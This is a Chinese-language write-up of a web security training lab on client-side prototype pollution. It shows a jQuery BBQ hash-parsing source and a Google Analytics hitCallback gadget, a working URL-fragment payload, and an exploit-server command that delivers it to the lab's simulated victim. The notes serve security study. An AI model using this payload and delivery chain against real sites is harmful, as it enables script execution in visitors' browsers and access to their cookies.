---
title: "lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries"
links:
  - target: prototype-pollution-family
    relation: evidences
---

# lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries

> evidences: [[prototype-pollution-family]]

- 题面:Client-side prototype pollution in third-party libraries(/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)
- 实例:https://0a070078038ec63c81d61b8700b700ad.web-security-academy.net
- 利用服务器:https://exploit-0ab3002b03d4c69f81d31a04013b0025.exploit-server.net
- 判定目标:交付 payload 使访客浏览器执行 `alert(document.cookie)`;状态:**solved**

## 面(第三方库双件)

- source:`jquery_1-7-1.js` + `jquery_ba_bbq.js`;`store.js` 绑 `hashchange` → `$.bbq.getState('cat')`
  → BBQ `$.deparam(location.hash)`(无 proto 守卫,`O=O[P]=...`)。
- gadget:`ga.js`(真 Google Analytics 5.7.2 minified)中 `tc=Va("hitCallback")`,发射器:
  ```js
  var Vc=function(a){ var c=a.get(tc); ... this.Ja=function(){ !b.fb&&c&&setTimeout(c,10) }; ... };
  ```
  `a.get('hitCallback')` 继承原型上的攻击串 → `setTimeout(<string>,10)` **按源码求值**。

## 载荷

```
https://<inst>/#__proto__[hitCallback]=alert(document.cookie)
```
注意:BBQ deparam 的 `K=Q.split("=")` 要求值内不含 `=`(否则 `K.length!=2` 不落键)。

## 交付(exploit server)

```
lab_http post https://<exploit>/ --jar <jar> --follow \
  --form urlIsHttps=on --form responseFile=/exploit \
  --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: text/html' \
  --form "responseBody=<script>location='https://<inst>/#__proto__[hitCallback]=alert(document.cookie)'</script>" \
  --form formAction=DELIVER_TO_VICTIM
```
交付后 exploit 服务器与实例横幅均 `is-solved`;`solved_check <inst>` -> true。

## 备注

- 本地复现:`lab_alert "#__proto__[hitCallback]=alert(document.cookie)"` 触发(消息取 document.cookie,可能为空)。
- 第三方库题先找 PP 源(URL/hash 解析器),再在 minified 库里搜 `setTimeout`/`hitCallback` 类回调 gadg
